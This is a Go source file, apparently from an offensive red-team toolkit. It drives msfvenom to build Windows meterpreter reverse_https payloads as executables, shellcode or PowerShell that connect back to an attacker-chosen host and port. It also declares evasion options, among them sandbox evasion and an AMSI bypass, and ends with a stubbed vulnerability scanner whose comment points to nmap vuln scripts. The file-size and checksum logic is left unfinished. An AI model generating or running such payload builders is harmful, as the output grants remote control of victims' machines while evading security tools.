package payload

import (
	"context"
	"fmt"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// PayloadType supported types
const (
	TypeWindowsEXE  = "windows_exe"
	TypeWindowsDLL  = "windows_dll"
	TypeLinuxELF    = "linux_elf"
	TypeMacOS       = "macos"
	TypeShellcode   = "shellcode"
	TypeHTA         = "hta"
	TypePowerShell  = "powershell"
)

// EvasionOptions for payload generation (passed to external tools)
type EvasionOptions struct {
	SleepObfuscation bool   `json:"sleep_obfuscation"`
	SandboxEvasion   bool   `json:"sandbox_evasion"`
	AMSIBypass       bool   `json:"amsi_bypass"` // Instruct external tool to include
	Arch             string `json:"arch"`         // x86, x64
	Encoder          string `json:"encoder"`      // x64/xor, etc.
}

// Generator orchestrates payload creation via msfvenom, Sliver, etc.
type Generator struct {
	msfvenomPath string
	outputDir    string
}

// NewGenerator creates payload generator
func NewGenerator(msfvenomPath, outputDir string) *Generator {
	if msfvenomPath == "" {
		msfvenomPath = "msfvenom"
	}
	if outputDir == "" {
		outputDir = "./payloads"
	}
	return &Generator{msfvenomPath: msfvenomPath, outputDir: outputDir}
}

// GenerateRequest payload generation request
type GenerateRequest struct {
	Type       string
	LHOST      string
	LPORT      int
	Format     string
	Evasion    *EvasionOptions
	OutputName string
}

// GenerateResult result
type GenerateResult struct {
	Path     string
	Size     int64
	Checksum string
	Duration time.Duration
	Error    string
}

// Generate creates payload via msfvenom
func (g *Generator) Generate(ctx context.Context, req *GenerateRequest) (*GenerateResult, error) {
	start := time.Now()
	outPath := filepath.Join(g.outputDir, req.OutputName)
	if outPath == g.outputDir {
		outPath = filepath.Join(g.outputDir, fmt.Sprintf("payload_%d", time.Now().Unix()))
	}

	var args []string
	switch req.Type {
	case TypeWindowsEXE:
		args = []string{
			"-p", "windows/x64/meterpreter/reverse_https",
			"LHOST=" + req.LHOST,
			fmt.Sprintf("LPORT=%d", req.LPORT),
			"-f", "exe",
			"-o", outPath,
		}
	case TypeShellcode:
		args = []string{
			"-p", "windows/x64/meterpreter/reverse_https",
			"LHOST=" + req.LHOST,
			fmt.Sprintf("LPORT=%d", req.LPORT),
			"-f", "c",
			"-o", outPath,
		}
	case TypePowerShell:
		args = []string{
			"-p", "windows/x64/meterpreter/reverse_https",
			"LHOST=" + req.LHOST,
			fmt.Sprintf("LPORT=%d", req.LPORT),
			"-f", "psh",
			"-o", outPath,
		}
	default:
		return &GenerateResult{Error: "unsupported payload type"}, nil
	}

	if req.Evasion != nil && req.Evasion.Encoder != "" {
		args = append(args, "-e", req.Evasion.Encoder)
	}

	cmd := exec.CommandContext(ctx, g.msfvenomPath, args...)
	output, err := cmd.CombinedOutput()
	duration := time.Since(start)
	if err != nil {
		return &GenerateResult{
			Error:    string(output) + err.Error(),
			Duration: duration,
		}, nil
	}

	// Get file size
	var size int64
	// stat file...
	_ = output

	return &GenerateResult{
		Path:     outPath,
		Size:     size,
		Duration: duration,
	}, nil
}

// VulnScanConfig for lightweight vulnerability scanning
type VulnScanConfig struct {
	Targets    []string
	Ports      []int
	ScanType   string // quick, full
}

// VulnScanResult single finding
type VulnScanResult struct {
	Target   string
	Port     int
	Service  string
	Banner   string
	Possible []string // e.g. ["CVE-2020-xxx", "MS17-010"]
}

// VulnScanner conceptual scanner (delegates to nmap, etc.)
type VulnScanner struct{}

// Scan runs scan - в production: вызов nmap -sV --script vuln
func (s *VulnScanner) Scan(ctx context.Context, cfg *VulnScanConfig) ([]VulnScanResult, error) {
	_ = ctx
	_ = cfg
	return nil, nil
}
